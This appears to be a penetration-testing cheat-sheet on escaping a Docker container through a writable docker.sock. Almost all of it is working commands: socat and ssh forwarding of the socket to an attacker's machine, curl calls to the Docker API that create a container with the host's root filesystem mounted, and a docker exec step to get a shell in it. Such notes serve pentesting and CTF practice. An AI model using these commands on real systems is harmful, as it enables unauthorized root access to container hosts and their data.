# Docker Escape
## Writable docker.sock
- Forward docker.sock to attack machine tcp and sock
```sh
# In container:
# use socat to forward local port to docker socket (can use any other port forward tool)
socat -d -d -d -lf socat.log UNIX-LISTEN:/run/docker.sock,reuseaddr,fork TCP:127.0.0.1:8080

#On attack machine
# forward port 8080 over ssh
ssh -L 8080:localhost:8080 user@ip -p 2222
# use socat to create custom socket
socat -d -d -d -lf socat.log UNIX-LISTEN:./docker.sock,reuseaddr,fork TCP:localhost:8080
```
- List host images:
```bash
curl -XGET http://localhost:8080/images/json
```
- Create a container with host / mounted on /host_root
```bash
curl -XPOST -H "Content-Type: application/json" -d '{"Image":"sha256:26a697c0d00f06d8ab5cd16669d0b4898f6ad2c19c73c8f5e27231596f5bec5e","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost:8080/containers/create
```
- List containers
```sh
curl -XGET http://localhost:8080/containers/json
```
- Use docker client to get a shell into our new container
```sh
docker -H unix://./docker.sock exec -it jovial_bassi /bin/bash
```